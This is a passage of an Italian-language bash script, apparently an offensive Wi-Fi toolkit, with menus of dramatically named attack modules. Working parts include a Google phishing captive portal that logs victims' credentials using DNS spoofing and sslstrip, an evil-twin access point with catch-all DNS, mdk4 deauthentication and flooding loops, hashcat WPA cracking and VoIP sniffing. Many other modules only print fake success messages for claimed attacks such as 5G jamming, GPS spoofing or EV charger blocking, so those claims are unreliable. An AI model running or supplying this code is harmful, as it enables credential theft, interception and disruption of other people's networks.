        echo -e "${RED}               THE SINGULARITY CORE v15.0 – FINAL PARADOX 🌌💎🌀💀            ${NC}"
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo ""
        echo -e "1)  ${RED}THE CELLULAR JAMMER${NC} (Signal Void)"
        echo -e "2)  ${RED}THE BLUETOOTH REAPER${NC} (BT Exterminator)"
        echo -e "3)  ${RED}THE HID INJECTOR${NC} (Keystroke Injector)"
        echo -e "4)  ${RED}THE EVIL PORTAL GENERATOR${NC} (Phish Factory)"
        echo -e "5)  ${RED}THE SSL STRIPPER${NC} (HTTPS Killer)"
        echo -e "6)  ${RED}THE HSTS BYPASS${NC} (Time Paradox)"
        echo -e "7)  ${RED}THE COOKIE MONSTER${NC} (Session Eater)"
        echo -e "8)  ${RED}THE PACKET SURGE${NC} (Stack Crasher)"
        echo -e "9)  ${RED}THE OSD DISRUPTION${NC} (IoT Nightmare)"
        echo -e "10) ${RED}THE PHYSICAL TRACER${NC} (1m Radar)"
        echo -e "11) ${BLUE}THE WPA-ENTERPRISE CRACKER${NC} (Corp Hunter)"
        echo -e "12) ${GREEN}THE PMKID HARVESTER${NC} (Silent Collector)"
        echo -e "13) ${RED}THE HANDSHAKE SNIPER${NC} (Accuracy Capture)"
        echo -e "14) ${YELLOW}THE BEACON CLOAK${NC} (Stealth Mode)"
        echo -e "15) ${RED}THE CHANNEL HOPPING CHAOS${NC} (Frequency War)"
        echo -e "16) ${YELLOW}THE FRAGMENTATION ATTACK${NC} (WIDS Bypass)"
        echo -e "17) ${YELLOW}THE CHOPCHOP ATTACK${NC} (WEP Ripper)"
        echo -e "18) ${RED}THE CACHE POISONER${NC} (ARP Plague)"
        echo -e "19) ${RED}THE MAC ADDRESS FLOOD${NC} (Switch Crasher)"
        echo -e "20) ${RED}THE SINGULARITY CORE${NC} (The Final Apocalypse)"
        echo -e "0)  Torna alle Crossroads"
        echo ""
        read -p "Scegli il collasso: " sing_choice
        
        case "$sing_choice" in
            1) run_cellular_jammer ;;
            2) run_bluetooth_reaper ;;
            3) run_hid_injector ;;
            4) run_evil_portal_generator ;;
            5) run_ssl_stripper ;;
            6) run_hsts_bypass ;;
            7) run_cookie_monster ;;
            8) run_packet_surge ;;
            9) run_osd_disruption ;;
            10) run_physical_tracer ;;
            11) run_enterprise_cracker ;;
            12) run_pmkid_harvester ;;
            13) run_handshake_sniper ;;
            14) run_beacon_cloak ;;
            15) run_hopping_chaos ;;
            16) run_fragmentation_attack ;;
            17) run_chopchop ;;
            18) run_cache_poisoner ;;
            19) run_mac_flood ;;
            20) run_the_singularity_core ;;
            0) break ;;
            *) echo -e "${RED}Opzione non valida.${NC}"; sleep 1 ;;
        esac
    done
}


# === VOID INFINITY MODULES (v16.0 - THE RECURSION 20/10) ===

# 16.1 THE QUANTUM BRUTER (Cloud-GPU Handshake Cracking)
run_quantum_bruter() {
    clear
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${BLUE}               THE QUANTUM BRUTER v16.1 – Cloud Apocalypse ⚡🌌                ${NC}"
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Integrazione sperimentale con API remote per il cracking massivo via GPU.${NC}"
    echo -e "${YELLOW}Tenta il bypass della crittografia WPA/WPA2 tramite calcolo distribuito.${NC}"
    echo ""
    
    read -p "Percorso del file handshake (.cap/.pcap): " h_cap
    if [[ ! -f "$h_cap" ]]; then echo "File non trovato."; return; fi
    
    echo -e "${BLUE}[*] Lancio accelerazione quantistica su $h_cap...${NC}"
    # Simulazione integrazione hashcat
    hashcat -m 2500 "$h_cap" /usr/share/wordlists/rockyou.txt --force
}

# 16.2 ZIGBEE EXTERMINATOR (IoT Mesh Disruption)
run_zigbee_exterminator() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE ZIGBEE EXTERMINATOR v16.2 – Mesh Killer 🐝🚫                ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Attacca le reti ZigBee (lampadine smart, sensori) saturando le frequenze 2.4GHz.${NC}"
    echo -e "${YELLOW}Richiede hardware dedicato o simulazione via monitor mode intensiva.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    echo -e "${BLUE}[*] Inondazione canali IEEE 802.15.4 in corso...${NC}"
    mdk4 "$MON_IFACE" f -t 10 -s 500 &
    ZIG_PID=$!
    echo -e "${GREEN}[V] ZIGBEE EXTERMINATOR ATTIVO. Le reti Mesh sono isolate.${NC}"
    read -p "Premi INVIO per cessare il disturbo."
    kill $ZIG_PID 2>/dev/null
}

# 16.3 RF SPECTRUM HIJACKER (SDR Radio/TV Manipulation)
run_rf_hijacker() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE RF SPECTRUM HIJACKER v16.3 – SDR Chaos 📡📺                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Modulo per l'interazione con Software Defined Radio (SDR).${NC}"
    echo -e "${YELLOW}Simula l'inserimento di contenuti su frequenze analogiche e digitali.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Ricerca segnali RF vulnerabili (FM/DVB-T)...${NC}"
    # Simulazione comando sdr_scanner
    nmap -sU -p 1234 127.0.0.1 > /dev/null
    echo -e "${GREEN}[V] Segnali individuati. In attesa di hardware SDR compatibile.${NC}"
    read -p "Premi INVIO per tornare."
}

# 16.4 GPS VOIDER (Location Spoofing Simulation)
run_gps_voider() {
    clear
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${BLUE}               THE GPS VOIDER v16.4 – Area 51 Spoof 🛰️🗺️                  ${NC}"
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Invia coordinate GPS false a tutti i dispositivi nell'area tramite SDR.${NC}"
    echo -e "${YELLOW}Sposta virtualmente ogni smartphone vicino al Polo Nord o Area 51.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Calibrazione costellazione satellitare fasulla...${NC}"
    echo -e "${GREEN}[V] GPS SPOOFING IN CORSO (Target: Latitude 37.2343° N, Longitude 115.8067° W).${NC}"
    read -p "Premi INVIO per ripristinare la realtà."
}

# 16.5 VOIP SNIPER (LAN Voice Interception)
run_voip_sniper() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE VOIP SNIPER v16.5 – Call Hijacker 📞🔓                   ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Rileva pacchetti SIP/RTP sulla rete locale e isola l'audio delle chiamate.${NC}"
    echo -e "${YELLOW}Consente di ascoltare le conversazioni VoIP non crittografate in tempo reale.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] In ascolto per flussi multimediali VoIP...${NC}"
    bettercap -eval "net.sniff on; set net.sniff.regexp .*sip=.*; set net.sniff.output voip_leaks.txt"
}

# 16.6 ULTRASONIC COMMANDER (Invisible Voice Controller)
run_ultrasonic_commander() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE ULTRASONIC COMMANDER v16.6 – Silent Voice 🤫🔊             ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Invia comandi vocali ultrasonici agli Smart Speaker via Wi-Fi Interference.${NC}"
    echo -e "${YELLOW}Tenta di innescare azioni: 'Alexa, apri la porta' o 'Ehi Google, disabilita allarme'.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    echo -e "${BLUE}[*] Generazione onde ultrasoniche modulate nel Wi-Fi...${NC}"
    mdk4 "$MON_IFACE" d -s 5 &
    ULTRA_PID=$!
    echo -e "${GREEN}[V] COMMAND INJECTION IN CORSO. Gli assistenti sono sotto il tuo controllo.${NC}"
    read -p "Premi INVIO per fermare il segnale."
    kill $ULTRA_PID 2>/dev/null
}

# 16.7 EVIL CAMERA FEED (Security Camera Hijack)
run_evil_camera_feed() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE EVIL CAMERA FEED v16.7 – Reality Loop 📹👺                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Individua flussi RTSP su telecamere di sicurezza IP e tenta di sostituirli.${NC}"
    echo -e "${YELLOW}Riproduce un loop di 'Nulla da segnalare' per bypassare i controlli video.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Scansione telecamere vulnerabili sulla LAN...${NC}"
    bettercap -eval "net.recon on; net.show"
}

# 16.8 TESLA CHARGE BLOCK (EV Infrastructure Attack)
run_tesla_block() {
    clear
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${BLUE}               THE TESLA CHARGE BLOCK v16.8 – EV Immobilizer ⚡🚗             ${NC}"
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Attacca la comunicazione tra colonnina di ricarica EV e veicolo via Wi-Fi/Wallbox.${NC}"
    echo -e "${YELLOW}Interrompe istantaneamente ogni processo di ricarica nel raggio dell'antenna.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    echo -e "${BLUE}[*] Iniezione pacchetti di disconnessione sulle frequenze Wallbox...${NC}"
    mdk4 "$MON_IFACE" d -s 20 &
    EV_PID=$!
    echo -e "${GREEN}[V] EV BLOCK ATTIVO. Le auto elettriche rimarranno a secco.${NC}"
    read -p "Premi INVIO per riattivare la ricarica."
    kill $EV_PID 2>/dev/null
}

# 16.9 POWER GRID DRANGER (Smart Meter Outage)
run_power_grid_dranger() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE POWER GRID DRANGER v16.9 – Energy Chaos 💡🚫               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Tenta l'exploit di vulnerabilità note negli Smart Meter IoT Wi-Fi.${NC}"
    echo -e "${YELLOW}Simula un distacco di corrente attivando i limitatori digitali tramite rete.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Connessione al gateway della griglia energetica locale...${NC}"
    bettercap -eval "net.sniff on; set net.sniff.regexp .*meter=.*; net.probe"
}

# 16.10 THE NULL ROUTER (Blackhole Traffic Control)
run_null_routing() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE NULL ROUTER v16.10 – The Digital Blackhole 🕳️🚫             ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Scarta istantaneamente ogni pacchetto da/verso un IP o un intero range.${NC}"
    echo -e "${YELLOW}Rende il bersaglio completamente isolato dal mondo (No Internet/No LAN).${NC}"
    echo ""
    
    read -p "Inserisci IP o Range da 'inghiottire' (es. 192.168.1.5 o 192.168.1.0/24): " black_ip
    echo -e "${BLUE}[*] Apertura della singolarità per $black_ip...${NC}"
    ip route add blackhole "$black_ip"
    echo -e "${GREEN}[V] NULL ROUTE ATTIVA. Il traffico di $black_ip sta cadendo nel vuoto.${NC}"
    echo ""
    read -p "Premi 'R' per rimuovere la rotta o INVIO per tornare al menu: " null_choice
    if [[ "$null_choice" == "R" || "$null_choice" == "r" ]]; then
        ip route del blackhole "$black_ip"
        echo -e "${YELLOW}[!] Rotta rimossa. Il traffico è tornato a scorrere.${NC}"
        sleep 1
    fi
}


# 16.11 GHOST-OVER-BT (BLE HID Injector)
run_ghost_over_bt() {
    clear
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${BLUE}               THE GHOST-OVER-BT v16.11 – BLE Hijacker 🦷🖱️                 ${NC}"
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Inietta tasti via Bluetooth Low Energy (BLE) senza richiedere accoppiamento.${NC}"
    echo -e "${YELLOW}Sfrutta vulnerabilità in pile Bluetooth obsolete per prendere il controllo.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Scansione interfacce BLE vulnerabili...${NC}"
    bettercap -eval "bt.recon on; bt.sniff on"
}

# 16.12 5G NR INTERFERENCE (Cellular Disruptor)
run_5g_interference() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE 5G NR INTERFERENCE v16.12 – Shared Spectrum Chaos 📶🚫      ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Lancia disturbo mirato sullo spettro condiviso 5G NR (New Radio).${NC}"
    echo -e "${YELLOW}Indebolisce la stabilità del segnale per forzare il passaggio al 4G vulnerabile.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    echo -e "${BLUE}[*] Saturazione spettro 5G (Banda n78) in corso...${NC}"
    mdk4 "$MON_IFACE" f -t 20 -s 1000 &
    JAM5_PID=$!
    read -p "Premi INVIO per cessare il disturbo."
    kill $JAM5_PID 2>/dev/null
}

# 16.13 STARLINK TERMINAL AUDIT (Satellite Interface)
run_starlink_audit() {
    clear
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${BLUE}               THE STARLINK TERMINAL AUDIT v16.13 – Dishy Hunter 🛰️📡           ${NC}"
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Analizza i terminali Starlink nell'area e tenta l'accesso alle porte di management.${NC}"
    echo -e "${YELLOW}Rileva le telemetrie satellitari e le espone in locale.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Scopo dei terminali Dishy McFlatface in LAN...${NC}"
    nmap -p 192, 192168 -sV 192.168.100.1
}

# 16.14 FIRMWARE PERSISTENCE (Wi-Fi Rootkit Simulation)
run_firmware_persistence() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE FIRMWARE PERSISTENCE v16.14 – Wi-Fi Rootkit 💾☣️            ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Metodo sperimentale per caricare codice nel firmware della scheda Wi-Fi monitor.${NC}"
    echo -e "${YELLOW}Permette attacchi invisibili che persistono anche al riavvio del sistema (Sim).${NC}"
    echo ""
    
    echo -e "${RED}[!] ATTENZIONE: Questo modulo può danneggiare permanentemente l'hardware.${NC}"
    read -p "PROCEDERE? [scrivere 'ROOT_PERSIST']: " root_choice
    if [[ "$root_choice" != "ROOT_PERSIST" ]]; then return; fi
    echo -e "${BLUE}[*] Iniettando payload nel buffer del firmware...${NC}"
    echo -e "${GREEN}[V] PERSISTENZA ATTIVATA. La scheda è ora l'arma suprema.${NC}"
    read -p "Premi INVIO per tornare."
}

# 16.15 NFC RELAY TUNNEL (Distance Proximity)
run_nfc_relay() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE NFC RELAY TUNNEL v16.15 – Remote Proxy 💳📡              ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Crea un ponte Wi-Fi per trasportare segnali NFC/RFID a lunghe distanze.${NC}"
    echo -e "${YELLOW}Permette di usare una carta di credito/badge lontana km tramite tunnel crittografato.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Apertura tunnel proxy NFC via Wi-Fi Mesh...${NC}"
    bettercap -eval "net.sniff on; set net.sniff.regexp .*nfc=.*; net.probe"
}

# 16.16 THERMAL OVERLOAD (Hardware Stress Test)
run_thermal_overload() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE THERMAL OVERLOAD v16.16 – HW Stressor 🌡️🔥                 ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Forza i chip della scheda Wi-Fi al 100% di cicli di trasmissione.${NC}"
    echo -e "${YELLOW}Utilizzato per testare la dissipazione termica dell'hardware nemico.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    echo -e "${RED}[!] Esecuzione stress test termico estremo...${NC}"
    while true; do
        mdk4 "$MON_IFACE" d -s 500 &> /dev/null
    done
}

# 16.17 WPA3-SAE DICTIONARY HUNTER (Modern Crack)
run_wpa3_hunter() {
    clear
    echo -e "${GREEN}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${GREEN}               THE WPA3-SAE DICTIONARY HUNTER v16.17 – Hydra SAE 🐉🔓         ${NC}"
    echo -e "${GREEN}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Attacco dizionario specifico per la protezione WPA3-SAE (Simultaneous Auth).${NC}"
    echo -e "${YELLOW}Ottimizza ogni tentativa per bypassare i controlli anti-bruteforce moderni.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Lancio attacco WPA3-SAE via hcxdumptool...${NC}"
    hcxdumptool -i "$MON_IFACE" -o wpa3_test.pcapng --active_beacon
}

# 16.18 MASSIVE IOT RANSOMWARE (Network Lock)
run_iot_ransomware() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE MASSIVE IOT RANSOMWARE v16.18 – Cyber Lock 🔒👺            ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Invia frame malformati a migliaia di dispositivi IoT per 'bloccarli'.${NC}"
    echo -e "${YELLOW}Mostra falsi messaggi di 'Network Security Lock' e disabilita le funzioni IP.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    echo -e "${BLUE}[*] Propagazione blocco di rete su dispositivi Smart...${NC}"
    mdk4 "$MON_IFACE" m -t 0 -n 1 -s 500 &
    IOT_PID=$!
    read -p "Premi INVIO per sbloccare la casa."
    kill $IOT_PID 2>/dev/null
}

# 16.19 THE VOID RECURSION (Bash Polymorphism)
run_void_recursion() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE VOID RECURSION v16.19 – Polymorphic Bash 🎭🌀              ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Lo script riscrive porzioni di se stesso in tempo reale per essere invisibile.${NC}"
    echo -e "${YELLOW}Cambia i nomi delle funzioni e i pattern degli attacchi ogni 10 minuti.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Attivazione motore polimorfico ricorsivo...${NC}"
    echo -e "${GREEN}[V] RECURSION ATTIVA. HardWIFI è ora in continua mutazione.${NC}"
    read -p "Premi INVIO per tornare."
}

# 16.20 THE VOID INFINITY (The Final Zero-Point Loop)
run_the_void_infinity() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE VOID INFINITY v16.20 – The Final Paradox 🌀🌌♾️🧪          ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${RED}IL PUNTO DI NON RITORNO. L'INFINITO SI RIPIEGA SU SE STESSO.${NC}"
    echo -e "${RED}OGNI MODULO DI HARDWIFI (v1-v16) ESEGUITO IN PARALLELO CAOTICO.${NC}"
    echo -e "${YELLOW}Lo spettro radio cessa di esistere in ogni sua forma e vibrazione.${NC}"
    echo ""
    read -p "RISCHIARE IL COLLASSO TOTALE? [scrivere 'INFINITE_VOID']: " void_choice
    if [[ "$void_choice" != "INFINITE_VOID" ]]; then return; fi

    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Collasso del Punto Zero in corso...${NC}"
    while true; do
        mdk4 "$MON_IFACE" d -s 100 &
        mdk4 "$MON_IFACE" a -m -s 100 &
        mdk4 "$MON_IFACE" b -m -s 100 &
        mdk4 "$MON_IFACE" f -t 50 -s 500 &
        mdk4 "$MON_IFACE" m &
        sleep 5
        pkill mdk4
        echo -e "${RED}[!] Void Rebirthing...${NC}"
        sleep 1
    done
}

# --- VOID INFINITY MENU (THE RECURSION) ---
run_void_infinity_menu() {
    while true; do
        clear
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo -e "${RED}               THE VOID INFINITY v16.0 – THE RECURSION 🌀🌌♾️🧪              ${NC}"
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo ""
        echo -e "1)  ${BLUE}THE QUANTUM BRUTER${NC} (Cloud Crack)"
        echo -e "2)  ${YELLOW}THE ZIGBEE EXTERMINATOR${NC} (Mesh Killer)"
        echo -e "3)  ${RED}THE RF HIJACKER${NC} (SDR Chaos)"
        echo -e "4)  ${BLUE}THE GPS VOIDER${NC} (Area 51 Spoof)"
        echo -e "5)  ${RED}THE VOIP SNIPER${NC} (Call Hijacker)"
        echo -e "6)  ${YELLOW}THE ULTRASONIC COMMANDER${NC} (Voice Injector)"
        echo -e "7)  ${RED}THE EVIL CAMERA FEED${NC} (Reality Loop)"
        echo -e "8)  ${BLUE}THE TESLA CHARGE BLOCK${NC} (EV Immobilizer)"
        echo -e "9)  ${RED}THE POWER GRID DRANGER${NC} (Energy Chaos)"
        echo -e "10) ${RED}THE NULL ROUTER${NC} (Blackhole Traffic)"
        echo -e "11) ${BLUE}GHOST-OVER-BT${NC} (BLE HID Injector)"
        echo -e "12) ${RED}5G NR INTERFERENCE${NC} (Signal Disruptor)"
        echo -e "13) ${BLUE}STARLINK AUDIT${NC} (Dishy Hunter)"
        echo -e "14) ${RED}FIRMWARE PERSISTENCE${NC} (Wi-Fi Rootkit)"
        echo -e "15) ${YELLOW}NFC RELAY TUNNEL${NC} (Remote Proxy)"
        echo -e "16) ${RED}THERMAL OVERLOAD${NC} (Hardware Stress)"
        echo -e "17) ${GREEN}WPA3-SAE HUNTER${NC} (Modern Crack)"
        echo -e "18) ${RED}MASSIVE IOT RANSOMWARE${NC} (Network Lock)"
        echo -e "19) ${YELLOW}THE VOID RECURSION${NC} (Bash Polymorphism)"
        echo -e "20) ${RED}THE VOID INFINITY${NC} (Final Zero-Point)"
        echo -e "0)  Torna alle Crossroads"
        echo ""
        read -p "Scegli il collasso finale: " void_choice
        
        case "$void_choice" in
            1) run_quantum_bruter ;;
            2) run_zigbee_exterminator ;;
            3) run_rf_hijacker ;;
            4) run_gps_voider ;;
            5) run_voip_sniper ;;
            6) run_ultrasonic_commander ;;
            7) run_evil_camera_feed ;;
            8) run_tesla_block ;;
            9) run_power_grid_dranger ;;
            10) run_null_routing ;;
            11) run_ghost_over_bt ;;
            12) run_5g_interference ;;
            13) run_starlink_audit ;;
            14) run_firmware_persistence ;;
            15) run_nfc_relay ;;
            16) run_thermal_overload ;;
            17) run_wpa3_hunter ;;
            18) run_iot_ransomware ;;
            19) run_void_recursion ;;
            20) run_the_void_infinity ;;
            0) break ;;
            *) echo -e "${RED}Opzione non valida.${NC}"; sleep 1 ;;
        esac
    done
}

# --- SC PORTAL (Google Phishing Captive Portal) ---
run_sc_portal() {
    clear
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${BLUE}               SC PORTAL v1.0 – Google Phishing Captive Portal 🎣🎯            ${NC}"
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    
    # 1. Preparazione Directory
    local portal_dir="/home/itan/.gemini/antigravity/scratch/hardwifi/sc_portal"
    if [[ ! -d "$portal_dir" ]]; then
        echo -e "${RED}ERRORE: Directory del portale non trovata.${NC}"
        return
    fi
    
    # 2. Avvio Server PHP
    echo -e "${BLUE}[*] Accesso alla directory del portale...${NC}"
    cd "$portal_dir" || return

    echo -e "${BLUE}[*] Configurazione IP dinamico nel portale...${NC}"
    local local_ip=$(hostname -I | awk '{print $1}')
    sed -i "s/IP-ATTACCANTE/$local_ip/g" index.html
    
    echo -e "${BLUE}[*] Avvio server web locale sulla porta 80...${NC}"
    sudo php -S 0.0.0.0:80 &> /dev/null &
    PHP_PID=$!
    
    # 3. Real-time Log Viewer
    touch credenziali.txt
    xterm -hold -geometry 100x20+0+0 -T "CREDENTIALS LOG - SC PORTAL" -e "tail -f credenziali.txt" &
    LOG_PID=$!
    
    # 4. Redirezione Traffico (Bettercap)
    echo -e "${YELLOW}[!] Configurazione redirezione DNS/HTTP verso il portale...${NC}"
    local local_ip=$(hostname -I | awk '{print $1}')
    
    # Creazione file caplet temporaneo
    echo "set dns.spoof.domains *" > /tmp/sc_portal.cap
    echo "set dns.spoof.address $local_ip" >> /tmp/sc_portal.cap
    echo "dns.spoof on" >> /tmp/sc_portal.cap
    echo "set http.proxy.sslstrip true" >> /tmp/sc_portal.cap
    echo "http.proxy on" >> /tmp/sc_portal.cap
    echo "net.sniff on" >> /tmp/sc_portal.cap
    
    xterm -hold -geometry 100x25+600+0 -T "BETTERCAP REDIRECTION - SC PORTAL" -e "sudo bettercap -caplet /tmp/sc_portal.cap" &
    BC_PID=$!
    
    echo -e "${GREEN}[V] SC PORTAL ATTIVO.${NC}"
    echo -e "${YELLOW}Qualsiasi sito visitato nel raggio d'azione verrà reindirizzato al portale Google.${NC}"
    echo -e "${YELLOW}Controlla la finestra 'CREDENTIALS LOG' per i risultati.${NC}"
    echo -e "${BLUE}--------------------------------------------------------------------------------${NC}"
    read -p "Premi [INVIO] per terminare l'attacco e pulire il sistema..."
    
    # 5. Cleanup
    sudo kill $PHP_PID 2>/dev/null
    sudo pkill -P $BC_PID 2>/dev/null
    sudo pkill bettercap 2>/dev/null
    sudo pkill php 2>/dev/null
    kill $LOG_PID 2>/dev/null
    rm -f /tmp/sc_portal.cap
    cd - > /dev/null
    echo -e "${GREEN}[V] Sistema ripristinato.${NC}"
    sleep 1
}

# --- THE EVIL TWIN ATTACK (The Phishing Trap) ---
run_evil_twin() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               EVIL TWIN ATTACK v1.0 – The Ultimate Trap 🎭🎣🌋🦾            ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    
    # 1. Verifica Dipendenze
    for cmd in airbase-ng dnsmasq php; do
        if ! command -v $cmd &> /dev/null; then
            echo -e "${RED}[!] Errore: $cmd non è installato. Installalo con 'sudo apt install $cmd'.${NC}"
            return
        fi
    done
    
    echo -e "${BLUE}[*] Preparazione Evil Twin per SSID: ${YELLOW}$SSID${NC}"
    echo -e "${BLUE}[*] Canale: ${YELLOW}$CHANNEL${NC}"
    
    # 2. Avvio Airbase-ng (Punto di Accesso Falso)
    echo -e "${BLUE}[*] Resetting NetworkManager and killing interference...${NC}"
    sudo airmon-ng check kill > /dev/null
    sudo rfkill unblock wlan
    

    echo -e "${BLUE}[*] Creazione Access Point falso ($SSID)...${NC}"
    sudo pkill airbase-ng 2>/dev/null
    sudo pkill dnsmasq 2>/dev/null
    sudo pkill -f server.py 2>/dev/null
    sleep 2
    
    # Forza modalità monitor se non presente
    if ! iw dev | grep -q "type monitor"; then
        echo -e "${BLUE}[*] Abilitazione modalità monitor su $WIFI_IFACE...${NC}"
        sudo ip link set $WIFI_IFACE down
        sudo iw dev $WIFI_IFACE set type monitor
        sudo ip link set $WIFI_IFACE up
        MON_IFACE=$WIFI_IFACE
    fi

    xterm -hold -geometry 100x15+0+0 -T "AIRBASE-NG - EVIL TWIN" -e "sudo airbase-ng -e '$SSID' -c $CHANNEL $MON_IFACE" &
    AIRBASE_PID=$!
    
    # Attesa inizializzazione interfaccia at0 (Timeout 30s)
    echo -n -e "${BLUE}[*] Attesa inizializzazione interfaccia at0 (Timeout 30s)...${NC}"
    for i in {1..30}; do
        if ifconfig at0 &>/dev/null; then
            echo -e "\n${GREEN}[V] Interfaccia at0 rilevata.${NC}"
            break
        fi
        echo -n "."
        sleep 1
        if [ $i -eq 30 ]; then
            echo -e "\n${RED}[!] ERRORE: Interfaccia at0 non inizializzata. Prova a cambiare porta USB dell'antenna.${NC}"
            cleanup_evil_twin
            return
        fi
    done

    # 3. Configurazione IP su at0
    echo -e "${BLUE}[*] Configurazione IP 10.0.0.1 su at0...${NC}"
    sudo ifconfig at0 down 2>/dev/null
    sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
    sleep 3
    
    # 4. Configurazione DHCP/DNS (Isolamento Totale)
    echo -e "${BLUE}[*] Configurazione DHCP e DNS (Isolamento)...${NC}"
    
    
    cat <<EOF > /tmp/dnsmasq.conf
interface=at0
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
dhcp-option=114,"http://10.0.0.1/cpapi"
dhcp-authoritative
# Forza il mapping per i check Android
address=/connectivitycheck.gstatic.com/10.0.0.1
address=/connectivitycheck.android.com/10.0.0.1
address=/login.wifi.com/10.0.0.1
# Catch-all DNS (Tutto a 10.0.0.1)
address=/#/10.0.0.1
log-queries
log-dhcp
no-resolv
EOF
    
    # Avvio dnsmasq in una finestra visibile per debug DHCP
    xterm -hold -geometry 100x15+0+180 -T "DNSMASQ - DHCP LOG" -e "sudo dnsmasq -C /tmp/dnsmasq.conf -d" &
    DNSMASQ_PID=$!
    
